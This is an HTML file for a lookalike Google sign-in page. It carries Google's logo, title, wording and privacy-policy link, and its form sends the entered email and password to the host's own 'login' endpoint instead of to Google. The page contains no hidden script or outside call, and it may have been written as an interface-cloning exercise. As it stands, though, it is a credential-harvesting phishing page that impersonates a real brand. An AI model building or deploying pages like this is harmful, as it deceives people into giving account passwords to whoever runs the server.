
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-form">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
            <h2>Sign in</h2>
            <p>Use your Google Account</p>
            <form action="login" method="POST">
                <input type="email" name="email" placeholder="Email or phone" required>
                <div class="forgot-email">
                    <a href="#">Forgot email?</a>
                </div>
                <input type="password" name="password" placeholder="Enter your password" required>
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
                <button type="submit">Next</button>
            </form>
            <div class="create-account">
                <p>Not your computer? Use Guest mode to sign in privately.</p>
                <a href="https://policies.google.com/privacy?hl=en-IN&fg=1">Learn more</a>
                <div class="divider"></div>
                <a href="creatacc.html" class="create-account-btn">Create account</a>
            </div>
        </div>
    </div>
</body>
</html>
